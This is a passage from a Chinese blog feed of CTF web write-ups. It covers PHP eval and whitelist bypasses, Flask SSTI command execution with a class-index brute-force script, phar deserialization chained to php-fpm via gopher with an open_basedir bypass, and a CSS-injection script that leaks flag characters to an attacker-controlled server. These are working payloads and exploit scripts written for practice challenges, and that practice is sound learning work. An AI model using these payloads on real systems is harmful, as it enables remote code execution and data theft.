preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;帮你算出答案</span><br><span class="line">    eval(&#39;echo &#39;.$content.&#39;;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;cos&#125;)&amp;pi&#x3D;system&amp;cos&#x3D;cat &#x2F;flag</span><br><span class="line">base_convert(37907361743,10,36)&#x3D;&gt;hex2bin</span><br><span class="line">dechex(1598506324)&#x3D;&gt;&quot;5f474554&quot;</span><br><span class="line">hex2bin(&quot;5f474554&quot;)&#x3D;&gt;_GET</span><br><span class="line">$$pi&#x3D;&gt;$_GET</span><br><span class="line">($$pi)&#123;pi&#125;(($$pi)&#123;cos&#125;)&amp;pi&#x3D;system&amp;cos&#x3D;cat &#x2F;flag&#x3D;&gt;$_GET&#123;pi&#125;$_GET&#123;cos&#125;pi&#x3D;system&amp;cos&#x3D;cat</span><br></pre></td></tr></table></figure>
<h2 id="相同类型"><a href="#相同类型" class="headerlink" title="相同类型"></a>相同类型</h2><ul>
<li>[NESTCTF 2019]Love Math 1</li>
<li>[NESTCTF 2019]Love Math 2</li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[<a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">CISCN 2019 初赛]Love Math</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>[CSCCTF 2019 Qual]FlaskLight</title>
    <url>/2020/04/15/CTF_WP/%5BCSCCTF%202019%20Qual%5DFlaskLight/</url>
    <content><![CDATA[<h1 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目是flask，打开查看网页源代码，发现提示传参search，fuzz测试</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;1*2&#125;&#125;</span><br><span class="line">#返回结果2可以判定有SSTI</span><br><span class="line">查看&#123;&#123;config&#125;&#125;发现一些信息</span><br></pre></td></tr></table></figure>
<p>然后就是常规的模板注入</p>
<p>[Templates Injections](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Template Injection)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br><span class="line">#可以爆出所有的类</span><br></pre></td></tr></table></figure>
<p>写了一个脚本查找可以利用的类</p>
<p>利用<code>subprocess.Popen</code>执行命令,详情参考链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import html</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">index &#x3D; 0</span><br><span class="line">for i in range(170, 1000):</span><br><span class="line">    try:</span><br><span class="line">        url &#x3D; &quot;http:&#x2F;&#x2F;5a8d97da-4cb0-43f8-9810-e9c352e034ad.node3.buuoj.cn&#x2F;?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[&quot; + str(i) + &quot;]&#125;&#125;&quot;</span><br><span class="line">        r &#x3D; requests.get(url)</span><br><span class="line">        res &#x3D; re.findall(&quot;&lt;h2&gt;You searched for:&lt;\&#x2F;h2&gt;\W+&lt;h3&gt;(.*)&lt;\&#x2F;h3&gt;&quot;, r.text)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        # print(res)</span><br><span class="line">        # print(r.text)</span><br><span class="line">        res &#x3D; html.unescape(res[0])</span><br><span class="line">        print(str(i) + &quot; | &quot; + res)</span><br><span class="line">        if &quot;subprocess.Popen&quot; in res:</span><br><span class="line">            index &#x3D; i</span><br><span class="line">            break</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br><span class="line">print(&quot;indexo of subprocess.Popen:&quot; + str(index))</span><br></pre></td></tr></table></figure>
<p>找到类名的index之后很简单了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line"></span><br><span class="line">?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line"></span><br><span class="line">?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
        <tag>FLaskSSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>[GXYCTF2019]禁止套娃</title>
    <url>/2020/03/16/CTF_WP/%5BGXYCTF2019%5D%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83%20WP/</url>
    <content><![CDATA[<h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line">scandir() 列出 images 目录中的文件和目录。</span><br><span class="line">readfile() 输出一个文件。</span><br><span class="line">current() 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line">pos() current() 的别名。</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">array_reverse()以相反的元素顺序返回数组。</span><br><span class="line">highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。</span><br><span class="line">show_source() 显示文件内容</span><br></pre></td></tr></table></figure>
<a id="more"></a>

<h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>img后面的参数base32,base63,hex解码得555.png</p>
<p>index.php hex,base64,base32编码传参img在网页源代码img标签解码base64得到源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#39;exp&#39;]))&#123;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;data:\&#x2F;\&#x2F;|filter:\&#x2F;\&#x2F;|php:\&#x2F;\&#x2F;|phar:\&#x2F;\&#x2F;&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">        if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">            if (!preg_match(&#39;&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">                &#x2F;&#x2F; echo $_GET[&#39;exp&#39;];</span><br><span class="line">                @eval($_GET[&#39;exp&#39;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?exp&#x3D;show_source(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<p>主要利用点<code>pos(localeconv())</code>或者<code>current(localeconv())</code>变成<code>.</code></p>
<p><code>array_reverse</code>数组反转</p>
<p><code>next</code>将指针指向第二个,为flag.php</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>[INS’hAck 2019]Atchap</title>
    <url>/2020/04/18/CTF_WP/%5BINS&#39;hAck%202019%5DAtchap/</url>
    <content><![CDATA[<h1 id="INS’hAck-2019-Atchap"><a href="#INS’hAck-2019-Atchap" class="headerlink" title="[INS’hAck 2019]Atchap"></a>[INS’hAck 2019]Atchap</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>利用邮件服务器漏洞</p>
<p><a href="https://medium.com/@fs0c131y/tchap-the-super-not-secure-app-of-the-french-government-84b31517d144">Tchap: The super (not) secure app of the French government</a></p>
<a id="more"></a>

<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>buu注册一个邮箱</p>
<p>发送自己的邮箱,提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You&#39;re not whitelisted or not part of the company..</span><br></pre></td></tr></table></figure>
<p>发送下面contact us的邮箱<code>Samira.Bien@almosttchap.fr</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You&#39;re not using your official address..</span><br></pre></td></tr></table></figure>
<p>发送</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yourmail@mail.com@Samira.Bien@almosttchap.fr</span><br></pre></td></tr></table></figure>
<p>在邮箱中查看邮件中得到flag</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
        <tag>邮件服务器漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>[NCTF2019]phar matches everything</title>
    <url>/2020/05/02/CTF_WP/%5BNCTF2019%5Dphar%20matches%20everything/</url>
    <content><![CDATA[<h1 id="NCTF2019-phar-matches-everything"><a href="#NCTF2019-phar-matches-everything" class="headerlink" title="[NCTF2019]phar matches everything"></a>[NCTF2019]phar matches everything</h1><a id="more"></a>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><strong>源码</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Easytest&#123;</span><br><span class="line">    protected $test;</span><br><span class="line">    public function funny_get()&#123;</span><br><span class="line">        return $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Main &#123;</span><br><span class="line">    public $url;</span><br><span class="line">    public function curl($url)&#123;</span><br><span class="line">        $ch &#x3D; curl_init();  </span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);</span><br><span class="line">        $output&#x3D;curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line">public function __destruct()&#123;</span><br><span class="line">        $this_is_a_easy_test&#x3D;unserialize($_GET[&#39;careful&#39;]);</span><br><span class="line">        if($this_is_a_easy_test-&gt;funny_get() &#x3D;&#x3D;&#x3D; &#39;1&#39;)&#123;</span><br><span class="line">            echo $this-&gt;curl($this-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line">if(isset($_POST[&quot;submit&quot;])) &#123;</span><br><span class="line">    $check &#x3D; getimagesize($_POST[&#39;name&#39;]);</span><br><span class="line">    if($check !&#x3D;&#x3D; false) &#123;</span><br><span class="line">        echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;File is not an image.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="两次序列化"><a href="#两次序列化" class="headerlink" title="两次序列化"></a>两次序列化</h3><p>第一个是利用<code>getimagesize($file_path)</code>触发<code>phar</code>反序列化，触发的反序列化影响Main类</p>
<p>第二个很简单,要是<code>Easytest</code>中的<code>test=1</code></p>
<p>利用<code>curl</code>读取文件</p>
<p><strong>exp.php</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Easytest &#123;</span><br><span class="line">	protected $test &#x3D; &#39;1&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Main &#123;</span><br><span class="line">	public $url &#x3D;&#39;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new Easytest();</span><br><span class="line">echo serialize($a);</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">$b &#x3D; new Main();</span><br><span class="line">@unlink(&quot;exp.phar&quot;);</span><br><span class="line">$phar &#x3D; new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&#39;GIF89a&#39; . &quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($b);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(&#39;exp.char&#39;, &quot;exp.gif&quot;);</span><br></pre></td></tr></table></figure>
<p>首先上传<code>exp.gif</code></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200502/6dYAPUL1PxQC.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200502/6dYAPUL1PxQC.png?imageslim" alt="mark"></a></p>
<p>然后利用<code>catchmime.php</code>传参触发反序列化</p>
<p><code>careful</code>用来触发2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#96;用来触发&#96;phar</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200502/IvRGNO5gryyM.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200502/IvRGNO5gryyM.png?imageslim" alt="mark"></a></p>
<p>改变<code>url</code>读取hosts,因为这道题想让我们打内网</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200502/ARLi3vvvsEdD.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200502/ARLi3vvvsEdD.png?imageslim" alt="mark"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200502/ctjN6Nkrlpv9.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200502/ctjN6Nkrlpv9.png?imageslim" alt="mark"></a></p>
<p>我读取到了<code>173.187.197.10</code>,再用http协议读一下<code>http://173.187.197.10</code>,发现就是当前页面,再读一下 <code>http://173.187.197.11</code></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200502/wgylUttLBoAT.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200502/wgylUttLBoAT.png?imageslim" alt="mark"></a></p>
<h3 id="php-fpm未授权漏洞"><a href="#php-fpm未授权漏洞" class="headerlink" title="php-fpm未授权漏洞"></a>php-fpm未授权漏洞</h3><p><a href="https://evoa.me/index.php/archives/52/#toc-SSRFGopher">php-fpm未授权漏洞</a></p>
<p>使用链接中的<code>exp</code></p>
<p>再使用<code>gopher</code>协议使用exp生成的<code>payload</code></p>
<p>先打<code>phpinfo();</code>可以得知需要绕过<code>open_basedir</code></p>
<p>加上绕过<code>open_basedir</code>的payload就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php mkdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));readfile(&#39;&#x2F;flag&#39;);?&gt;</span><br></pre></td></tr></table></figure>
<p>flag在根目录</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200502/MkFvqjnF23zV.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200502/MkFvqjnF23zV.png?imageslim" alt="mark"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200502/cCKxtrWK4nWi.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200502/cCKxtrWK4nWi.png?imageslim" alt="mark"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200502/VDMHTyd45wxR.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200502/VDMHTyd45wxR.png?imageslim" alt="mark"></a></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[<a href="https://guokeya.github.io/post/1byvbzb_I/">NCTF2019]phar matches everything(phar反序列化)</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PHP</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
        <tag>WP</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>[安洵杯 2019]cssgame</title>
    <url>/2020/04/17/CTF_WP/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Dcssgame/</url>
    <content><![CDATA[<h1 id="安洵杯-2019-cssgame"><a href="#安洵杯-2019-cssgame" class="headerlink" title="[安洵杯 2019]cssgame"></a>[安洵杯 2019]cssgame</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>很有意思的CSS injection</p>
<p>大致的思路就是通过传入一个外部链接的css,让flag.html解析,</p>
<p>外部链接的css写入如下内容</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">input[name&#x3D;flag][value^&#x3D;&quot;f&quot;] ~ * &#123;background-image: url(&quot;http:&#x2F;&#x2F;x.x.x.x&#x2F;?flag&#x3D;f&quot;);&#125;</span><br></pre></td></tr></table></figure>
<p>然后对flag值进行逐位判断，如果正确则发送数据给vps</p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><strong>exp</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&quot;poc.css&quot;, &quot;w&quot;)</span><br><span class="line">dic &#x3D; &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;-&quot;</span><br><span class="line">for i in dic:</span><br><span class="line">    flag &#x3D; sys.argv[1] + i</span><br><span class="line">    payload &#x3D; &quot;input[name&#x3D;flag][value^&#x3D;\&quot;&quot; + flag + &quot;\&quot;] ~ * &#123;background-image: url(\&quot;http:&#x2F;&#x2F;174.0.31.242:8080&#x2F;?&quot; + flag + &quot;\&quot;);&#125;&quot;</span><br><span class="line">    f.write(payload + &quot;\n&quot;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>在buu申请一台小号linux lab,然后在/var/www/html/目录写入以上exp,运行一下脚本,nc开启监听</p>
<p>然后就开始将<code>css=http://174.0.31.242/poc.css</code>post给<code>crawl.html</code>,在nc监听中可以得到flag,然后手动改flag的值,生成不同的poc.css,逐位爆破可以得到flag</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200417/7xPSKY9xQYDl.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200417/7xPSKY9xQYDl.png?imageslim" alt="mark"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200417/pBpeVx5eKtNN.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200417/pBpeVx5eKtNN.png?imageslim" alt="mark"></a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上方法还是有点麻烦的，看看官方wp，发现有更好的办法，学一手，INS</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[<a href="https://nikoeurus.github.io/2019/11/30/2019%E5%AE%89%E8%AF%A2%E6%9D%AF-Web/#cssgame">安洵杯 2019]cssgame wp</a></p>
<p>[<a href="https://xz.aliyun.com/t/6911#toc-12">安洵杯 2019]cssgame 官方WP</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
        <tag>CSS injection</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku_web11</title>
    <url>/2019/07/16/CTF_WP/bugku_web11/</url>
    <content><![CDATA[<h1 id="bugku-web11"><a href="#bugku-web11" class="headerlink" title="bugku_web11"></a>bugku_web11</h1><h2 id="题目地址："><a href="#题目地址：" class="headerlink" title="题目地址："></a>题目地址：</h2><p><a href="http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=">http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</a></p>
<p>备注：我用的是python3</p>
<a id="more"></a>

<h2 id="filename-a2V5cy50eHQ"><a href="#filename-a2V5cy50eHQ" class="headerlink" title="filename=a2V5cy50eHQ="></a>filename=a2V5cy50eHQ=</h2><p>文件包含</p>
<p>因为filename一般说明源代码中有读取打开文件的函数</p>
<p>从下面源码中可知的确含有函数file()</p>
<h2 id="base64格式"><a href="#base64格式" class="headerlink" title="base64格式"></a>base64格式</h2><p>大小写字母+=/</p>
<h1 id="line"><a href="#line" class="headerlink" title="line="></a>line=</h1><p>可能与读取行数有关</p>
<h1 id="php函数"><a href="#php函数" class="headerlink" title="php函数"></a>php函数</h1><p>isset()判断是非设置值</p>
<p>header url重定向</p>
<p>in_array 第一个是匹配字符，第二个是数组</p>
<p>file 读取文件每一行</p>
<h2 id="尝试文件读取的步骤"><a href="#尝试文件读取的步骤" class="headerlink" title="尝试文件读取的步骤"></a>尝试文件读取的步骤</h2><p>cookies 里面要有值</p>
<p>margin=margin</p>
<p>filename =keys.php</p>
<p>keys.php要base64加密a2V5cy5waHA=</p>
<p>获取的index.php的源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$file &#x3D; base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);</span><br><span class="line"></span><br><span class="line">$line&#x3D;isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;</span><br><span class="line"></span><br><span class="line">if($file&#x3D;&#x3D;&#39;&#39;) header(&quot;location:index.php?line&#x3D;&amp;filename&#x3D;a2V5cy50eHQ&#x3D;&quot;);</span><br><span class="line"></span><br><span class="line">$file_list &#x3D; array(</span><br><span class="line"></span><br><span class="line">&#39;0&#39; &#x3D;&gt;&#39;keys.txt&#39;,</span><br><span class="line"></span><br><span class="line">&#39;1&#39; &#x3D;&gt;&#39;index.php&#39;,</span><br><span class="line">&#39;2&#39;&#x3D;&gt; &#39;keys.php&#39;</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]&#x3D;&#x3D;&#39;margin&#39;)&#123;</span><br><span class="line"></span><br><span class="line">$file_list[2]&#x3D;&#39;keys.php&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">if(in_array($file, $file_list))&#123;</span><br><span class="line"></span><br><span class="line">$fa &#x3D; file($file);</span><br><span class="line"></span><br><span class="line">echo $fa[$line];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">import requests</span><br><span class="line">for a in range(0,100):</span><br><span class="line">    index_url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web11&#x2F;index.php?line&#x3D;&#39;+str(a)+&#39;&amp;filename&#x3D;aW5kZXgucGhw&#39;</span><br><span class="line">    session &#x3D; requests.session()</span><br><span class="line">    index &#x3D; session.get(index_url)</span><br><span class="line">    if index.text!&#x3D;&quot;&quot;:</span><br><span class="line">        print(index.text)</span><br><span class="line">    else:</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">for a in range(0,100):</span><br><span class="line">    flag_url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web11&#x2F;index.php?line&#x3D;&#39;+str(a)+&#39;&amp;filename&#x3D;a2V5cy5waHA&#x3D;&#39;</span><br><span class="line">    cook &#x3D; &#123;</span><br><span class="line">        &#39;margin&#39;:&#39;margin&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    flag &#x3D; session.get(flag_url,cookies&#x3D;cook)</span><br><span class="line">    if flag.text!&#x3D;&quot;&quot;:</span><br><span class="line">        print(flag.text)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
<h1 id="key-’KEY-key-keys"><a href="#key-’KEY-key-keys" class="headerlink" title="key=’KEY{key_keys}"></a>key=’KEY{key_keys}</h1><h1 id="解题步骤总结"><a href="#解题步骤总结" class="headerlink" title="解题步骤总结"></a>解题步骤总结</h1><h2 id="1-乱码试着解码"><a href="#1-乱码试着解码" class="headerlink" title="1.乱码试着解码"></a>1.乱码试着解码</h2><h2 id="2-url中的filename尝试文件包含"><a href="#2-url中的filename尝试文件包含" class="headerlink" title="2.url中的filename尝试文件包含"></a>2.url中的filename尝试文件包含</h2><h2 id="3-编写脚本"><a href="#3-编写脚本" class="headerlink" title="3.编写脚本"></a>3.编写脚本</h2><h2 id="4-代码审计"><a href="#4-代码审计" class="headerlink" title="4.代码审计"></a>4.代码审计</h2><h2 id="5-cookie满足要求"><a href="#5-cookie满足要求" class="headerlink" title="5.cookie满足要求"></a>5.cookie满足要求</h2><h2 id="6-继续脚本发送获取key"><a href="#6-继续脚本发送获取key" class="headerlink" title="6.继续脚本发送获取key"></a>6.继续脚本发送获取key</h2><h1 id="题目所需基础知识"><a href="#题目所需基础知识" class="headerlink" title="题目所需基础知识"></a>题目所需基础知识</h1><h4 id="php基础语法-函数看不懂可以查-不急"><a href="#php基础语法-函数看不懂可以查-不急" class="headerlink" title="php基础语法,函数看不懂可以查,不急"></a>php基础语法,函数看不懂可以查,不急</h4><h4 id="python基础语法-函数看不懂可以查-不急"><a href="#python基础语法-函数看不懂可以查-不急" class="headerlink" title="python基础语法,函数看不懂可以查,不急"></a>python基础语法,函数看不懂可以查,不急</h4><h4 id="requests库基本操作"><a href="#requests库基本操作" class="headerlink" title="requests库基本操作"></a>requests库基本操作</h4><h4 id="了解一下说明是cookies和session"><a href="#了解一下说明是cookies和session" class="headerlink" title="了解一下说明是cookies和session"></a>了解一下说明是cookies和session</h4><h4 id="http的response和request，head"><a href="#http的response和request，head" class="headerlink" title="http的response和request，head"></a>http的response和request，head</h4><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>解码网站：某个大佬的博客</p>
<p><a href="https://www.wishingstarmoye.com/">https://www.wishingstarmoye.com/</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow内部赛_WP</title>
    <url>/2020/03/29/CTF_WP/ctfshow_%E5%86%85%E9%83%A8%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="CTFshow内部赛-WP"><a href="#CTFshow内部赛-WP" class="headerlink" title="CTFshow内部赛_WP"></a>CTFshow内部赛_WP</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.zip源码泄露,代码审计,register.php中的黑名单限制较少,分析可得注册的用户名写入seesion,然后直接用session中的用户名待入查询,与2018网鼎杯Unfinish差不多,详情搜索</span><br></pre></td></tr></table></figure>
<a id="more"></a>

